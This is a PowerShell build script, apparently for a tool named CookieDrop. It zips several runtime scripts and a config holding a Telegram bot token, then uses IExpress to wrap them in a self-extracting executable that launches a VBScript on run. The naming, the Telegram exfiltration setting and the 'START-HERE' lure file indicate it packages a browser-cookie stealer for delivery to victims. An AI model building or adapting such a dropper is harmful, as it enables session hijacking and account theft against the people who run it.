#requires -version 5.1
# Builds CookieDrop.zip and CookieDrop.exe from the runtime files.
$ErrorActionPreference = 'Stop'
$here  = Split-Path -Parent $MyInvocation.MyCommand.Path
$files = 'CookieDrop.ps1','RUN.vbs','1-START-HERE.bat','RUN.bat','config.json'

foreach ($f in $files) {
    if (-not (Test-Path -LiteralPath (Join-Path $here $f))) { throw "missing $f" }
}

$cfg = Get-Content -LiteralPath (Join-Path $here 'config.json') -Raw | ConvertFrom-Json
if ($cfg.telegram.token -like 'PUT_*') { throw 'config.json still has a placeholder token' }

$zip = Join-Path $here 'CookieDrop.zip'
if (Test-Path -LiteralPath $zip) { Remove-Item -LiteralPath $zip -Force }
Compress-Archive -Path ($files | ForEach-Object { Join-Path $here $_ }) -DestinationPath $zip -Force
"zip: $zip  ($([math]::Round((Get-Item $zip).Length / 1KB, 1)) KB)"

$sed = Join-Path $here 'build.sed'
@"
[Version]
Class=IEXPRESS
SEDVersion=3
[Options]
PackagePurpose=InstallApp
ShowInstallProgramWindow=1
HideExtractAnimation=0
UseLongFileName=1
InsideCompressed=0
CAB_FixedSize=0
CAB_ResvCodeSigning=0
RebootMode=N
InstallPrompt=
DisplayLicense=
FinishMessage=
TargetName=$here\CookieDrop.exe
FriendlyName=CookieDrop
AppLaunched=wscript.exe RUN.vbs
PostInstallCmd=<None>
AdminQuietInstCmd=
UserQuietInstCmd=
SourceFiles=SourceFiles
[Strings]
FILE0="CookieDrop.ps1"
FILE1="RUN.vbs"
FILE2="config.json"
FILE3="1-START-HERE.bat"
FILE4="RUN.bat"
[SourceFiles]
SourceFiles0=$here\
[SourceFiles0]
%FILE0%=
%FILE1%=
%FILE2%=
%FILE3%=
%FILE4%=
"@ | Set-Content -LiteralPath $sed -Encoding ASCII

$exe = Join-Path $here 'CookieDrop.exe'
if (Test-Path -LiteralPath $exe) { Remove-Item -LiteralPath $exe -Force }
& "$env:WINDIR\System32\iexpress.exe" /N /Q $sed
Start-Sleep -Seconds 3
if (Test-Path -LiteralPath $exe) {
    "exe: $exe  ($([math]::Round((Get-Item $exe).Length / 1KB, 1)) KB)"
} else {
    'exe build failed - zip still usable'
}